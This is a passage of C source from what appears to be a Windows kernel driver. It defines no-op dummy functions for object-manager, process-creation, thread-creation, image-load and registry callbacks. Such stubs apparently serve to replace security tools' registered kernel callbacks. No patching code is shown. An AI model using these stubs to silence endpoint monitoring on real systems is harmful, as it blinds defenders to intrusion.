	UNREFERENCED_PARAMETER(Info);
	return OB_PREOP_SUCCESS;
}

/*
* Description:
* ObPostOpenDummyFunction is a dummy function for post ob callbacks.
*
* Parameters:
* @RegistrationContext [PVOID]						    -- Unused.
* @Info				   [POB_POST_OPERATION_INFORMATION] -- Unused.
*
* Returns:
* There is no return value.
*/
VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);
	UNREFERENCED_PARAMETER(Info);
	return;
}

/*
* Description:
* CreateProcessNotifyExDummyFunction is a dummy function for create process notify routine ex.
*
* Parameters:
* @Process    [PEPROCESS]			   -- Unused.
* @ProcessId  [HANDLE]			       -- Unused.
* @CreateInfo [PPS_CREATE_NOTIFY_INFO] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
	UNREFERENCED_PARAMETER(Process);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(CreateInfo);
	return;
}

/*
* Description:
* CreateProcessNotifyDummyFunction is a dummy function for create process notify routine.
*
* Parameters:
* @ParentId  [HANDLE]  -- Unused.
* @ProcessId [HANDLE]  -- Unused.
* @Create	 [BOOLEAN] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
	UNREFERENCED_PARAMETER(ParentId);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(Create);
	return;
}

/*
* Description:
* CreateThreadNotifyDummyFunction is a dummy function for create thread notify routine.
*
* Parameters:
* @ProcessId [HANDLE]  -- Unused.
* @ThreadId  [HANDLE]  -- Unused.
* @Create	 [BOOLEAN] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ThreadId);
	UNREFERENCED_PARAMETER(Create);
	return;
}

/*
* Description:
* LoadImageNotifyDummyFunction is a dummy function for load image notify routine.
*
* Parameters:
* @FullImageName [PUNICODE_STRING] -- Unused.
* @ProcessId	 [HANDLE]		   -- Unused.
* @ImageInfo	 [PIMAGE_INFO]	   -- Unused.
*
* Returns:
* There is no return value.
*/
void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
	UNREFERENCED_PARAMETER(FullImageName);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ImageInfo);
	return;
}

/*
* Description:
* RegistryCallbackDummyFunction is a dummy function for registry callbacks.
*
* Parameters:
* @CallbackContext [PVOID] -- Unused.
* @Argument1	   [PVOID] -- Unused.
* @Argument2	   [PVOID] -- Unused.
*
* Returns:
* STATUS_SUCCESS always.
*/
NTSTATUS RegistryCallbackDummyFunction(PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {
	UNREFERENCED_PARAMETER(CallbackContext);
	UNREFERENCED_PARAMETER(Argument1);
	UNREFERENCED_PARAMETER(Argument2);
	return STATUS_SUCCESS;
}